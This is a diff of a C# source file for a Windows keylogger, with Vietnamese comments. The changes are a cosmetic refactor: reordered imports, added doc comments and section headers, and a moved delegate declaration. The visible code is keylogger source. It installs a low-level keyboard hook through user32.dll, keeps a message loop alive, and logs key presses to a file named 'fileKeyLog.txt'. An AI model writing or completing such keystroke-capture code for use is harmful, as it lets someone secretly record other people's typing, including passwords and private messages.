@@ -1,21 +1,28 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
 
 namespace KeyLogger
 {
-    // Class lưu đường dẫn file log để chia sẻ giữa các luồng
+    /// <summary>
+    /// Class lưu đường dẫn file log để chia sẻ giữa các luồng
+    /// </summary>
     public class appstart
     {
         public static string path = "fileKeyLog.txt";
     }
 
+    /// <summary>
+    /// InterceptKeys - Hook bàn phím và ghi log
+    /// Sử dụng Low-Level Keyboard Hook của Windows API
+    /// </summary>
     public class InterceptKeys
     {
-        // --- CÁC HÀM IMPORT TỪ WINDOWS API (USER32.DLL) ---
+        // ==================== WINDOWS API IMPORTS ====================
+
         // GetKeyState: Kiểm tra trạng thái Shift/Capslock
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
         public static extern short GetKeyState(int keyCode);
@@ -36,12 +43,22 @@ namespace KeyLogger
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        // ==================== CONSTANTS ====================
+
         // Hằng số định nghĩa Hook bàn phím mức thấp
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
+        // ==================== FIELDS ====================
+
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+
+        // ==================== DELEGATE ====================
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        // ==================== PUBLIC METHODS ====================
 
         // Hàm khởi động Keylogger
         public static void startKLog()
@@ -50,6 +67,8 @@ namespace KeyLogger
             Application.Run(); // Giữ luồng sống
             UnhookWindowsHookEx(_hookID);
         }
+
+        // ==================== PRIVATE METHODS ====================
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -60,9 +79,9 @@ namespace KeyLogger
             }
         }
 
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        // ==================== HOOK CALLBACK ====================
 
-        // --- XỬ LÝ SỰ KIỆN KHI CÓ PHÍM NHẤN ---
+        // Xử lý sự kiện khi có phím nhấn
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
